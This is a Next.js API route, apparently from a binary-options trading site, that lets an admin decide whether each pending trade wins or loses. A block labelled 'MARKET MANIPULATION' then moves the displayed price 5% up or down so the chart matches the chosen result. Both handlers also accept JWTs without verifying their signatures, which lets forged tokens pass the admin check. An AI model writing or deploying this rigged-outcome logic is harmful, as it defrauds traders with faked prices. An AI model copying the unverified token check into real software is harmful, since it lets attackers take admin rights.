
import { NextRequest, NextResponse } from "next/server";
import { createServerClient, tryCreateAdminClient } from "@/lib/supabase";
import { isAdmin } from "@/lib/admin";

export const dynamic = 'force-dynamic';


export async function POST(request: NextRequest) {
    try {
        const supabase = createServerClient();

        // Auth & Admin Check
        const authHeader = request.headers.get("authorization");
        if (!authHeader) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
        const token = authHeader.replace("Bearer ", "").trim();

        // Validate Token and Admin Role
        let userId: string | null = null;
        try {
            const parts = token.split('.');
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            userId = payload.sub;
        } catch (e) {
            return NextResponse.json({ error: "Invalid token" }, { status: 401 });
        }

        if (!userId || !(await isAdmin(userId))) {
            return NextResponse.json({ error: "Forbidden" }, { status: 403 });
        }

        const body = await request.json();
        const { sessionId, action } = body;

        if (!sessionId || !['WIN', 'LOSS'].includes(action)) {
            return NextResponse.json({ error: "Invalid request" }, { status: 400 });
        }

        const adminClient = tryCreateAdminClient();
        if (!adminClient) {
            return NextResponse.json({ error: "Admin client unavailable" }, { status: 500 });
        }

        // Get Session
        const { data: session, error: sessionError } = await adminClient
            .from("trade_sessions")
            .select("*")
            .eq("id", sessionId)
            .single();

        if (sessionError || !session) {
            return NextResponse.json({ error: "Session not found" }, { status: 404 });
        }

        if (session.status !== 'PENDING') {
            return NextResponse.json({ error: "Session already finalized" }, { status: 400 });
        }

        // --- MARKET MANIPULATION START ---
        // 1. Get current market price
        const symbol = session.symbol.split('/')[0]; // BTC/USD -> BTC
        let currentPrice = 0;
        const { data: marketData } = await adminClient.from('market_state').select('price').eq('symbol', symbol).single();

        if (marketData) {
            currentPrice = Number(marketData.price);
        } else {
            // Fetch from session amount relative? Or just use a default?
            // Ideally we should have the price stored in session, but let's just use 100 if missing.
            currentPrice = 100;
        }

        let newPrice = currentPrice;
        let trend = 'RANDOM';

        // 2. Logic: Win = Pump, Loss = Dump (relative to current)
        // Note: For binary options, "Win" means price > entry. 
        // But here we simplify: Win action makes the graph go UP.
        if (action === 'WIN') {
            newPrice = currentPrice * 1.05; // +5%
            trend = 'UP';
        } else {
            newPrice = currentPrice * 0.95; // -5%
            trend = 'DOWN';
        }

        // 3. Update Market State (Triggers Realtime)
        await adminClient.from('market_state').upsert({
            symbol,
            price: newPrice,
            trend,
            last_updated: new Date().toISOString()
        });
        // --- MARKET MANIPULATION END ---

        // Update Session Outcome
        const status = action === 'WIN' ? 'WON' : 'LOST';

        const { error: updateError } = await adminClient
            .from("trade_sessions")
            .update({
                status: status,
                outcome_override: action,
                end_time: new Date().toISOString()
            })
            .eq("id", sessionId);

        if (updateError) {
            return NextResponse.json({ error: "Failed to update session" }, { status: 500 });
        }

        // Handle Payout if WIN
        if (action === 'WIN') {
            const payout = Number(session.amount) + (Number(session.amount) * 0.8);
            const { data: userData } = await adminClient
                .from("users")
                .select("account_balance")
                .eq("id", session.user_id)
                .single();

            if (userData) {
                const newBalance = Number(userData.account_balance) + payout;
                await adminClient
                    .from("users")
                    .update({ account_balance: newBalance })
                    .eq("id", session.user_id);

                // Create transaction record for WIN
                await adminClient
                    .from("transactions")
                    .insert({
                        user_id: session.user_id,
                        symbol: session.symbol,
                        type: 'sell', // Using 'sell' to indicate trade completion/win
                        quantity: 1,
                        price: payout,
                        total_amount: payout,
                    });
            }
        } else {
            // For LOSS, create transaction record showing the loss
            await adminClient
                .from("transactions")
                .insert({
                    user_id: session.user_id,
                    symbol: session.symbol,
                    type: 'sell', // Using 'sell' to indicate trade completion/loss
                    quantity: 1,
                    price: 0, // Loss means 0 return
                    total_amount: 0,
                });
        }

        return NextResponse.json({ success: true, status, newPrice });

    } catch (error) {
        console.error("Error updating trade session:", error);
        return NextResponse.json({ error: "Internal server error" }, { status: 500 });
    }
}


export async function GET(request: NextRequest) {
    // Fetch ALL pending sessions for Admin
    try {
        const authHeader = request.headers.get("authorization");
        if (!authHeader) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
        const token = authHeader.replace("Bearer ", "").trim();

        // Decode JWT token to get user ID
        let userId: string | null = null;
        try {
            const parts = token.split('.');
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            userId = payload.sub;
        } catch (e) {
            return NextResponse.json({ error: "Invalid token" }, { status: 401 });
        }

        if (!userId || !(await isAdmin(userId))) {
            return NextResponse.json({ error: "Forbidden" }, { status: 403 });
        }

        const adminClient = tryCreateAdminClient();
        if (!adminClient) return NextResponse.json({ error: "Server Error" }, { status: 500 });

        const { data: sessions, error } = await adminClient
            .from("trade_sessions")
            .select("*, users(email)") // Join with users to see who is trading
            .eq("status", "PENDING")
            .order("created_at", { ascending: false });

        if (error) throw error;

        return NextResponse.json(sessions);

    } catch (error) {
        console.error("Error fetching admin sessions:", error);
        return NextResponse.json({ error: "Internal server error" }, { status: 500 });
    }
}
